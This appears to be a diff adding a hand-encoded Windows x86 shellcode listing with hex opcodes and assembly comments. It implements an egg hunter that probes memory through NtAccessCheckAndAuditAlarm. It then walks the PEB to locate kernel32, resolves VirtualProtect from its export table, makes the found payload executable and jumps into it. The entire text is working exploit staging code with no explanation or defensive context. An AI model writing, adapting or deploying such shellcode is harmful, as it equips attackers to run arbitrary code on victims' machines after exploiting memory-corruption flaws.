@@ -1,0 +1,115 @@
+3531d2583c  xor edx, edx ------------- EGG HUNT---------
+3580caff3c  @NEXT:or dl, ff
+3580ce0f3c	or dh, 0f 
+359090423c  @INC: inc edx
+35526a023c	push edx; push 0x02 // NtAccessCheckAndAuditAlarm on: XP, VISTA, Win7
+3558cd2e3c	pop eax; int 0x2e
+353c05906a  cmp al, 05 ; access
+355a5a906a	pop edx
+3574d8903c	jz NEXT ;	if access denied
+355959b831	mov eax, 31..
+353307903c			   353307	
+358bfaaf6a	mov edi, edx ; scasd
+3575d1af6a  jnz INC ; scasd
+359059596a				;try to save stack
+3575c7573c  jnz INC	;edi - our tag push it! -------END-------
+3583ec043c  sub esp, 4
+3533C0903c  xor eax, eax
+35b030903c  mov AL,  30
+35648b003c  mov eax, fs:[eax]
+358b400c3c  mov eax,  fs:[eax+C]
+358b401c3c  mov eax,  fs:[eax+1C]
+358b50083c  @NMOD: mov edx,  [eax+08]
+358b78203c  mov edi,  [eax+20]
+358b00903c  mov eax,  [eax]
+35803f6b6a  cmp [edi],  'k'
+355b75e93c  jnz short  'mov edx,dword ptr [eax+08]'
+354747903c  inc edi, inc edi
+35803f656a  cmp [edi],  'e'
+355b75da3c  jnz short  NMOD:
+354747903c  inc edi, inc edi
+35803f726a  cmp [edi], 'r'
+355b75cb3c  jnz short  NMOD:
+354747903c  inc edi, inc edi
+35803f6e6a  cmp [edi], 'n'
+355b75bc3c  jnz short  NMOD:
+359090523c  push edx
+3583c23c3c  add edx,  3c  
+358b3a903c  mov edi,  [edx]
+358b14243c  mov edx,  [esp]
+3503d7903c  add edx,  edi
+3583c2783c  add edx,  78 
+358b3a903c  mov edi,  [edx]
+358b14243c  mov edx,  [esp]
+3503d7903c  add edx,  edi
+3583c2183c  add edx,  18
+358b3a903c  mov eax,  [edx]  ; eax -numbers
+3583c2043c  add edx,  4
+358b1a903c  mov ebx,  [edx]   
+35031c243c  add ebx,  [esp]   ; ebx - addr with adresses of funcs
+3583c2043c  add edx,  4
+358b32903c  mov esi,  [edx]   
+350334243c  add esi,  [esp]   ; esi - addr with adresses of names
+3583c2043c  add edx,  4
+358b0a903c  mov ecx, [edx]   
+35030c243c  add ecx, [esp] ; ecx - addr ord
+359090b83c
+350000903c
+35b063903c
+35b474503c		; ct\0\0
+359090b83c
+357465903c
+35b072903c
+35b46f503c		; rote 
+359090b83c
+356c50903c
+35b075903c
+35b461503c		; ualP
+359090b83c
+357274903c
+35b056903c 
+35b469503c		; push  'VirtualProtect\0\0' 
+358bd7903c  mov edx, edi
+3533C0903c  xor eax, eax
+3533ff903c  xor edi edi   
+355651533c  push regs
+359090903c  nop
+359090903c  nop
+359047573c  inc edi, push edi
+358b04243c  mov eax, [esp]
+35c1e0023c  shl eax, 2
+3503f0903c  add esi, eax
+358b06903c  mov eax, [esi]
+3583c4203c  add esp, 20
+350304243c  add eax,[esp]
+3583ec203c
+3533c9903c  xor
+35b10e903c  mov cl,e  ; length of 'VirtualProtect\0'
+3583c4103c  add esp, 10  ; [esp] - what we try to find, eax - what we have in current
+358bf4903c  mov esi, esp 
+358bf8903c  mov edi,  eax
+3583c4183c  add esp, 18
+35f3a6906a  repe cmps [esi], [edi]
+3574149014  jz ---
+3583ec243c  sub esp, 24
+355f5b593c  pop ... EDI EBX ECX ESI
+355e90903c
+35eb90903c  jmp loop
+3583ec243c  sub esp, 24
+355f5b593c  pop ... EDI EBX ECX ESI
+355e90903c
+35d1e7903c  shl ecx,1
+3503cf903c  add ecx, edi
+3533c0903c  xor eax,  eax
+35668b013c  mov ax, word ds:[ecx]
+35c1e0023c  shl eax, 2
+3503c3903c  add eax, ebx
+358b18903c  mov ebx,  [eax]
+3583c4103c  add esp, 10
+35031c243c  add ebx, [esp]  ; ebx - pointer on VirtualProtect()
+3583c4083c  add esp, 8                
+355F90903c  pop edi         ; restore addr
+35546a403c	push esp and push 01 
+356a01903c	push 22  - params 
+3557ffd33c	push edi and call VirtualProtect and jmp edi ; make executable
+35ffe7903c  and then jump
